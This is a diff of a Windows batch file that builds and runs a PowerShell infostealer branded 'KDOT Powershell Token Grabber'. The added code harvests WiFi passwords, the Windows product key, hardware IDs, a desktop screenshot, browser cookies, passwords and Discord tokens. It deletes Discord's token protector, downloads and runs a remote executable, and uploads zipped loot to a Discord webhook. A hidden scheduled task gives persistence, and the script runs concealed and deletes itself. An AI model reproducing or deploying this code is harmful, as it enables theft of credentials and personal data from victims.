@@ -6,9 +6,190 @@ if not "%1"=="am_admin" (
 )
 
 
-echo function CHECK_IF_ADMIN { > powershell.ps1
+echo function CHECK_IF_ADMIN { >> powershell.ps1
 echo     $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test >> powershell.ps1
 echo } >> powershell.ps1
+echo. >> powershell.ps1
+echo function EXFILTRATE-DATA { >> powershell.ps1
+echo     $webhook = "YOUR_WEBHOOK_HERE" >> powershell.ps1
+echo     $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing >> powershell.ps1
+echo     $ip = $ip.Content >> powershell.ps1
+echo     $ip ^> $env:LOCALAPPDATA\Temp\ip.txt >> powershell.ps1
+echo     $lang = (Get-WinUserLanguageList).LocalizedName >> powershell.ps1
+echo     $date = (get-date).toString("r") >> powershell.ps1
+echo     Get-ComputerInfo ^> $env:LOCALAPPDATA\Temp\system_info.txt >> powershell.ps1
+echo     $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption >> powershell.ps1
+echo     $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct ^| Select-Object -ExpandProperty UUID  >> powershell.ps1
+echo     $uuid ^> $env:LOCALAPPDATA\Temp\uuid.txt >> powershell.ps1
+echo     $cpu = Get-WmiObject -Class Win32_Processor ^| Select-Object -ExpandProperty Name >> powershell.ps1
+echo     $cpu ^> $env:LOCALAPPDATA\Temp\cpu.txt >> powershell.ps1
+echo     $fulldiskinfo = diskdata  ^| out-string  >> powershell.ps1
+echo     $fulldiskinfo ^> $env:temp\DiskInfo.txt >> powershell.ps1
+echo     $gpu = (Get-WmiObject Win32_VideoController).Name  >> powershell.ps1
+echo     $gpu ^> $env:LOCALAPPDATA\Temp\GPU.txt >> powershell.ps1
+echo     $format = " GB" >> powershell.ps1
+echo     $total = Get-CimInstance Win32_PhysicalMemory ^| Measure-Object -Property capacity -Sum ^| Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))} >> powershell.ps1
+echo     $raminfo = "$total" + "$format"   >> powershell.ps1
+echo     $mac = Get-NetAdapter -Name "*Wi-Fi*" ^| Select-Object -ExpandProperty MACAddress >> powershell.ps1
+echo     $mac ^> $env:LOCALAPPDATA\Temp\mac.txt >> powershell.ps1
+echo     $username = $env:USERNAME >> powershell.ps1
+echo     $hostname = $env:COMPUTERNAME >> powershell.ps1
+echo     $netstat = netstat -ano ^> $env:LOCALAPPDATA\Temp\netstat.txt >> powershell.ps1
+echo. >> powershell.ps1
+echo     # Extraction of WiFi Passwords >> powershell.ps1
+echo     $wifipasslist = netsh wlan show profiles ^| Select-String "\:(.+)$" ^| %%{$name=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{(netsh wlan show profile name="$name" key=clear)}  ^| Select-String "Key Content\W+\:(.+)$" ^| %%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} ^| out-string >> powershell.ps1
+echo     $wifi = $wifipasslist ^| out-string  >> powershell.ps1
+echo     $wifi ^> $env:temp\WIFIPasswords.txt >> powershell.ps1
+echo. >> powershell.ps1
+echo     # Startup Apps >> powershell.ps1
+echo     Get-CimInstance Win32_StartupCommand ^| Select-Object Name, command, Location, User ^| Format-List ^> $env:temp\StartUpApps.txt >> powershell.ps1
+echo. >> powershell.ps1
+echo     # Running Services >> powershell.ps1
+echo     Get-WmiObject win32_service ^|? State -match "running" ^| select Name, DisplayName, PathName, User ^| sort Name ^| ft -wrap -autosize ^>  $env:LOCALAPPDATA\Temp\running-services.txt >> powershell.ps1
+echo. >> powershell.ps1
+echo     # Running Applications >> powershell.ps1
+echo     Get-WmiObject win32_process ^| Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path ^| ft -wrap -autosize ^> $env:temp\running-applications.txt >> powershell.ps1
+echo. >> powershell.ps1
+echo     # TCP Connections >> powershell.ps1
+echo     Get-NetTCPConnection ^| select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(get-process -id $_.OwningProcess).ProcessName}}, @{Name="cmdline";Expression={(Get-WmiObject Win32_Process -filter "ProcessId = $($_.OwningProcess)").commandline}} ^| sort Remoteaddress -Descending ^| ft -wrap -autosize ^> $env:temp\tcp-connections.txt >> powershell.ps1
+echo. >> powershell.ps1
+echo     # Installed Applicatons >> powershell.ps1
+echo     Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ^| Select-Object DisplayName, DisplayVersion, Publisher, InstallDate ^| Format-Table ^> $env:temp\Installed-Applications.txt >> powershell.ps1
+echo. >> powershell.ps1
+echo     # Network Adapters >> powershell.ps1
+echo     Get-NetAdapter ^| ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize ^> $env:temp\NetworkAdapters.txt >> powershell.ps1
+echo. >> powershell.ps1
+echo     # Get Windows Product Key >> powershell.ps1
+echo. >> powershell.ps1
+echo     $ProductKey >> powershell.ps1
+echo     Get-ProductKey ^> $env:localappdata\temp\ProductKey.txt >> powershell.ps1
+echo. >> powershell.ps1
+echo     # Screenshot     >> powershell.ps1
+echo     Add-Type -AssemblyName System.Windows.Forms,System.Drawing >> powershell.ps1
+echo     $screens = [Windows.Forms.Screen]::AllScreens >> powershell.ps1
+echo     $top    = ($screens.Bounds.Top    ^| Measure-Object -Minimum).Minimum >> powershell.ps1
+echo     $left   = ($screens.Bounds.Left   ^| Measure-Object -Minimum).Minimum >> powershell.ps1
+echo     $width  = ($screens.Bounds.Right  ^| Measure-Object -Maximum).Maximum >> powershell.ps1
+echo     $height = ($screens.Bounds.Bottom ^| Measure-Object -Maximum).Maximum >> powershell.ps1
+echo     $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height) >> powershell.ps1
+echo     $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height) >> powershell.ps1
+echo     $graphics = [Drawing.Graphics]::FromImage($bmp) >> powershell.ps1
+echo     $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size) >> powershell.ps1
+echo     $bmp.Save("$env:localappdata\temp\desktop-screenshot.png") >> powershell.ps1
+echo     $graphics.Dispose() >> powershell.ps1
+echo     $bmp.Dispose() >> powershell.ps1
+echo. >> powershell.ps1
+echo. >> powershell.ps1
+echo     $embed_and_body = @{ >> powershell.ps1
+echo         "username" = "KDOT" >> powershell.ps1
+echo         "content" = "@everyone" >> powershell.ps1
+echo         "title" = "KDOT" >> powershell.ps1
+echo         "description" = "Powerful Token Grabber" >> powershell.ps1
+echo         "color" = "16711680" >> powershell.ps1
+echo         "avatar_url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif" >> powershell.ps1
+echo         "url" = "https://discord.gg/vk3rBhcj2y" >> powershell.ps1
+echo         "embeds" = @( >> powershell.ps1
+echo             @{ >> powershell.ps1
+echo                 "title" = "POWERSHELL GRABBER" >> powershell.ps1
+echo                 "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main" >> powershell.ps1
+echo                 "description" = "New victim info collected !" >> powershell.ps1
+echo                 "color" = "16711680" >> powershell.ps1
+echo                 "footer" = @{ >> powershell.ps1
+echo                     "text" = "Made by KDOT, GODFATHER and CHAINSKI" >> powershell.ps1
+echo                 } >> powershell.ps1
+echo                 "thumbnail" = @{ >> powershell.ps1
+echo                     "url" = "https://i.postimg.cc/m2SSKrBt/Logo.gif" >> powershell.ps1
+echo                 } >> powershell.ps1
+echo                 "fields" = @( >> powershell.ps1
+echo                     @{ >> powershell.ps1
+echo                         "name" = ":satellite: IP" >> powershell.ps1
+echo                         "value" = "``````$ip``````" >> powershell.ps1
+echo                     }, >> powershell.ps1
+echo                     @{ >> powershell.ps1
+echo                         "name" = ":bust_in_silhouette: User Information" >> powershell.ps1
+echo                         "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````" >> powershell.ps1
+echo                     }, >> powershell.ps1
+echo                     @{ >> powershell.ps1
+echo                         "name" = ":computer: Hardware" >> powershell.ps1
+echo                         "value" = "``````OS: $osversion `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac``````" >> powershell.ps1
+echo                     }, >> powershell.ps1
+echo                     @{ >> powershell.ps1
+echo                         "name" = ":floppy_disk: Disk" >> powershell.ps1
+echo                         "value" = "``````$fulldiskinfo``````" >> powershell.ps1
+echo                     } >> powershell.ps1
+echo                     @{ >> powershell.ps1
+echo                         "name" = ":signal_strength: WiFi" >> powershell.ps1
+echo                         "value" = "``````$wifi``````" >> powershell.ps1
+echo                     } >> powershell.ps1
+echo                 ) >> powershell.ps1
+echo             } >> powershell.ps1
+echo         ) >> powershell.ps1
+echo     } >> powershell.ps1
+echo. >> powershell.ps1
+echo     $payload = $embed_and_body ^| ConvertTo-Json -Depth 10 >> powershell.ps1
+echo     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing ^| Out-Null >> powershell.ps1
+echo. >> powershell.ps1
+echo     Set-Location $env:LOCALAPPDATA\Temp >> powershell.ps1
+echo. >> powershell.ps1
+echo     taskkill.exe /f /im "Discord.exe" ^| Out-Null >> powershell.ps1
+echo     taskkill.exe /f /im "DiscordCanary.exe" ^| Out-Null >> powershell.ps1
+echo     taskkill.exe /f /im "DiscordPTB.exe" ^| Out-Null >> powershell.ps1
+echo     taskkill.exe /f /im "DiscordTokenProtector.exe" ^| Out-Null >> powershell.ps1
+echo. >> powershell.ps1
+echo. >> powershell.ps1
+echo     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" >> powershell.ps1
+echo     if ($token_prot -eq $true) { >> powershell.ps1
+echo         Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force >> powershell.ps1
+echo     } >> powershell.ps1
+echo. >> powershell.ps1
+echo     $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat" >> powershell.ps1
+echo     if ($secure_dat -eq $true) { >> powershell.ps1
+echo         Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force >> powershell.ps1
+echo     } >> powershell.ps1
+echo. >> powershell.ps1
+echo     $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT" >> powershell.ps1
+echo     if ($TEMP_KOT -eq $false) { >> powershell.ps1
+echo         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory >> powershell.ps1
+echo     } >> powershell.ps1
+echo. >> powershell.ps1
+echo     # Faster Download Speed >> powershell.ps1
+echo     $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell.ps1
+echo. >> powershell.ps1
+echo     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell.ps1
+echo     $proc.WaitForExit() >> powershell.ps1
+echo. >> powershell.ps1
+echo     $extracted = "$env:LOCALAPPDATA\Temp" >> powershell.ps1
+echo     Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\KDOT\ip.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\KDOT\netstat.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\KDOT\system_info.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\KDOT\uuid.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\KDOT\mac.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\KDOT\browser-history.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\KDOT\tokens.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\KDOT\WIFIPasswords.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\KDOT\GPU.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\KDOT\Installed-Applications.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\KDOT\DiskInfo.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\KDOT\CPU.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\KDOT\NetworkAdapters.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\KDOT\ProductKey.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo     Move-Item -Path "$extracted\tcp-connections.txt" -Destination "$extracted\KDOT\tcp-connections.txt" -ErrorAction SilentlyContinue >> powershell.ps1
+echo. >> powershell.ps1
+echo     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force >> powershell.ps1
+echo     #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$extracted\KDOT.zip" -ContentType "multipart/form-data" >> powershell.ps1
+echo     #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$extracted\KDOT.zip" $webhook >> powershell.ps1
+echo     curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook >> powershell.ps1
+echo     Remove-Item "$extracted\KDOT.zip" >> powershell.ps1
+echo     Remove-Item "$extracted\KDOT" -Recurse >> powershell.ps1
+echo     Remove-Item "$extracted\main.exe" >> powershell.ps1
+echo } >> powershell.ps1
+echo. >> powershell.ps1
 echo function TASKS { >> powershell.ps1
 echo     $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT" >> powershell.ps1
 echo     if ($test_KDOT -eq $false) { >> powershell.ps1
@@ -30,118 +211,51 @@ echo         $schedule = New-ScheduledTaskTrigger -AtStartup >> powershell.ps1
 echo         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle hidden -File $env:APPDATA\KDOT\KDOT.ps1" >> powershell.ps1
 echo         Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Highest -Force >> powershell.ps1
 echo     } >> powershell.ps1
-echo     Grub >> powershell.ps1
+echo     EXFILTRATE-DATA >> powershell.ps1
 echo } >> powershell.ps1
-echo function Grub { >> powershell.ps1
-echo     $webhook = "YOUR_WEBHOOK_HERE" >> powershell.ps1
-echo     $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing >> powershell.ps1
-echo     $ip = $ip.Content >> powershell.ps1
-echo     $ip ^> $env:LOCALAPPDATA\Temp\ip.txt >> powershell.ps1
-echo     $system_info = systeminfo.exe ^> $env:LOCALAPPDATA\Temp\system_info.txt >> powershell.ps1
-echo     $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct ^| Select-Object -ExpandProperty UUID  >> powershell.ps1
-echo     $uuid ^> $env:LOCALAPPDATA\Temp\uuid.txt >> powershell.ps1
-echo     $mac = Get-WmiObject -Class Win32_NetworkAdapterConfiguration ^| Select-Object -ExpandProperty MACAddress >> powershell.ps1
-echo     $mac ^> $env:LOCALAPPDATA\Temp\mac.txt >> powershell.ps1
-echo     $username = $env:USERNAME >> powershell.ps1
-echo     $hostname = $env:COMPUTERNAME >> powershell.ps1
-echo     $netstat = netstat -ano ^> $env:LOCALAPPDATA\Temp\netstat.txt >> powershell.ps1
-echo     $embed_and_body = @{ >> powershell.ps1
-echo         "username" = "KDOT" >> powershell.ps1
-echo         "content" = "@everyone" >> powershell.ps1
-echo         "title" = "KDOT" >> powershell.ps1
-echo         "description" = "KDOT" >> powershell.ps1
-echo         "color" = "16711680" >> powershell.ps1
-echo         "avatar_url" = "https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png" >> powershell.ps1
-echo         "url" = "https://discord.gg/vk3rBhcj2y" >> powershell.ps1
-echo         "embeds" = @( >> powershell.ps1
-echo             @{ >> powershell.ps1
-echo                 "title" = "SOMALI GRABBER" >> powershell.ps1
-echo                 "url" = "https://discord.gg/vk3rBhcj2y" >> powershell.ps1
-echo                 "description" = "New person grabbed using KDOT's TOKEN GRABBER" >> powershell.ps1
-echo                 "color" = "16711680" >> powershell.ps1
-echo                 "footer" = @{ >> powershell.ps1
-echo                     "text" = "Made by KDOT and GODFATHER" >> powershell.ps1
-echo                 } >> powershell.ps1
-echo                 "thumbnail" = @{ >> powershell.ps1
-echo                     "url" = "https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png" >> powershell.ps1
-echo                 } >> powershell.ps1
-echo                 "fields" = @( >> powershell.ps1
-echo                     @{ >> powershell.ps1
-echo                         "name" = "IP" >> powershell.ps1
-echo                         "value" = "``````$ip``````" >> powershell.ps1
-echo                     }, >> powershell.ps1
-echo                     @{ >> powershell.ps1
-echo                         "name" = "Username" >> powershell.ps1
-echo                         "value" = "``````$username``````" >> powershell.ps1
-echo                     }, >> powershell.ps1
-echo                     @{ >> powershell.ps1
-echo                         "name" = "Hostname" >> powershell.ps1
-echo                         "value" = "``````$hostname``````" >> powershell.ps1
-echo                     }, >> powershell.ps1
-echo                     @{ >> powershell.ps1
-echo                         "name" = "UUID" >> powershell.ps1
-echo                         "value" = "``````$uuid``````" >> powershell.ps1
-echo                     }, >> powershell.ps1
-echo                     @{ >> powershell.ps1
-echo                         "name" = "MAC" >> powershell.ps1
-echo                         "value" = "``````$mac``````" >> powershell.ps1
-echo                     } >> powershell.ps1
-echo                 ) >> powershell.ps1
-echo             } >> powershell.ps1
-echo         ) >> powershell.ps1
+echo. >> powershell.ps1
+echo function diskdata { >> powershell.ps1
+echo     $disks = get-wmiobject Win32_LogicalDisk -computername "$env:computername" -Filter "DriveType = 3" >> powershell.ps1
+echo     foreach ($disk in $disks) { >> powershell.ps1
+echo         $letter = $disk.deviceID >> powershell.ps1
+echo         $volumename = $disk.volumename >> powershell.ps1
+echo         $totalspace = [math]::round($disk.size / 1GB, 2) >> powershell.ps1
+echo         $freespace = [math]::round($disk.freespace / 1GB, 2) >> powershell.ps1
+echo         $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2) >> powershell.ps1
+echo         $disk ^| Select-Object @{n = "Letter"; e = { $letter } }, @{n = "Volume Name"; e = { $volumename } }, @{n = "Total (GB)"; e = { ($totalspace).tostring()}}, @{n = "Free (GB)"; e = { ($freespace).tostring()}}, @{n = "Used (GB)"; e = { ($usedspace).tostring()}} ^| FT  >> powershell.ps1
 echo     } >> powershell.ps1
-echo     $payload = $embed_and_body ^| ConvertTo-Json -Depth 10 >> powershell.ps1
-echo     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" ^| Out-Null >> powershell.ps1
-echo     Set-Location $env:LOCALAPPDATA\Temp >> powershell.ps1
-echo     taskkill.exe /f /im "Discord.exe" ^| Out-Null >> powershell.ps1
-echo     taskkill.exe /f /im "DiscordCanary.exe" ^| Out-Null >> powershell.ps1
-echo     taskkill.exe /f /im "DiscordPTB.exe" ^| Out-Null >> powershell.ps1
-echo     taskkill.exe /f /im "DiscordTokenProtector.exe" ^| Out-Null >> powershell.ps1
-echo     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" >> powershell.ps1
-echo     if ($token_prot -eq $true) { >> powershell.ps1
-echo         Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force >> powershell.ps1
-echo     } >> powershell.ps1
-echo     $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat" >> powershell.ps1
-echo     if ($secure_dat -eq $true) { >> powershell.ps1
-echo         Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force >> powershell.ps1
-echo     } >> powershell.ps1
-echo     $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT" >> powershell.ps1
-echo     if ($TEMP_KOT -eq $false) { >> powershell.ps1
-echo         New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory >> powershell.ps1
-echo     } >> powershell.ps1
-echo     $gotta_make_sure = "penis"; Set-Content -Path "$env:LOCALAPPDATA\Temp\KDOT\bruh.txt" -Value "$gotta_make_sure" >> powershell.ps1
-echo     Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell.ps1
-echo     $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell.ps1
-echo     $proc.WaitForExit() >> powershell.ps1
-echo     $lol = "$env:LOCALAPPDATA\Temp" >> powershell.ps1
-echo     Move-Item -Path "$lol\ip.txt" -Destination "$lol\KDOT\ip.txt" -ErrorAction SilentlyContinue >> powershell.ps1
-echo     Move-Item -Path "$lol\netstat.txt" -Destination "$lol\KDOT\netstat.txt" -ErrorAction SilentlyContinue >> powershell.ps1
-echo     Move-Item -Path "$lol\system_info.txt" -Destination "$lol\KDOT\system_info.txt" -ErrorAction SilentlyContinue >> powershell.ps1
-echo     Move-Item -Path "$lol\uuid.txt" -Destination "$lol\KDOT\uuid.txt" -ErrorAction SilentlyContinue >> powershell.ps1
-echo     Move-Item -Path "$lol\mac.txt" -Destination "$lol\KDOT\mac.txt" -ErrorAction SilentlyContinue >> powershell.ps1
-echo     Move-Item -Path "$lol\browser-cookies.txt" -Destination "$lol\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue >> powershell.ps1
-echo     Move-Item -Path "$lol\browser-history.txt" -Destination "$lol\KDOT\browser-history.txt" -ErrorAction SilentlyContinue >> powershell.ps1
-echo     Move-Item -Path "$lol\browser-passwords.txt" -Destination "$lol\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue >> powershell.ps1
-echo     Move-Item -Path "$lol\desktop-screenshot.png" -Destination "$lol\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue >> powershell.ps1
-echo     Move-Item -Path "$lol\tokens.txt" -Destination "$lol\KDOT\tokens.txt" -ErrorAction SilentlyContinue >> powershell.ps1
-echo     Compress-Archive -Path "$lol\KDOT" -DestinationPath "$lol\KDOT.zip" -Force >> powershell.ps1
-echo     #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$lol\KDOT.zip" -ContentType "multipart/form-data" >> powershell.ps1
-echo     #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$lol\KDOT.zip" $webhook >> powershell.ps1
-echo     curl.exe -X POST -F 'payload_json={\"username\": \"KING KDOT\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png\"}' -F "file=@$lol\KDOT.zip" $webhook >> powershell.ps1
-echo     Remove-Item "$lol\KDOT.zip" >> powershell.ps1
-echo     Remove-Item "$lol\KDOT" -Recurse >> powershell.ps1
-echo     Remove-Item "$lol\main.exe" >> powershell.ps1
 echo } >> powershell.ps1
+echo. >> powershell.ps1
+echo function Get-ProductKey { >> powershell.ps1
+echo     $map="BCDFGHJKMPQRTVWXY2346789" >> powershell.ps1
+echo     $value = (get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").digitalproductid[0x34..0x42] >> powershell.ps1
+echo     $ProductKey = "" >> powershell.ps1
+echo     for ($i = 24; $i -ge 0; $i--) { >> powershell.ps1
+echo         $r = 0 >> powershell.ps1
+echo         for ($j = 14; $j -ge 0; $j--) { >> powershell.ps1
+echo             $r = ($r * 256) -bxor $value[$j] >> powershell.ps1
+echo             $value[$j] = [math]::Floor([double]($r / 24)) >> powershell.ps1
+echo             $r = $r %% 24 >> powershell.ps1
+echo         } >> powershell.ps1
+echo         $ProductKey = $map[$r] + $ProductKey >> powershell.ps1
+echo. >> powershell.ps1
+echo         if (($i %% 5) -eq 0 -and $i -ne 0) { >> powershell.ps1
+echo             $ProductKey = "-" + $ProductKey >> powershell.ps1
+echo         } >> powershell.ps1
+echo     } >> powershell.ps1
+echo } >> powershell.ps1
+echo. >> powershell.ps1
 echo if (CHECK_IF_ADMIN -eq $true) { >> powershell.ps1
 echo     TASKS >> powershell.ps1
 echo     #pause >> powershell.ps1
 echo } else { >> powershell.ps1
 echo     Write-Host ("Please run as admin!") -ForegroundColor Red >> powershell.ps1
 echo     $origin = $MyInvocation.MyCommand.Path >> powershell.ps1
-echo     Start-Process powershell -ArgumentList "-noprofile -file $origin" -verb RunAs >> powershell.ps1
+echo     Start-Process powershell.exe -ArgumentList "-noprofile -file $origin" -verb RunAs >> powershell.ps1
 echo } >> powershell.ps1
+
 powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
-powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file powershell.ps1
+powershell.exe -executionpolicy bypass -WindowStyle hidden -file powershell.ps1
 del powershell.ps1 /f /q
 timeout 3 > nul
 exit
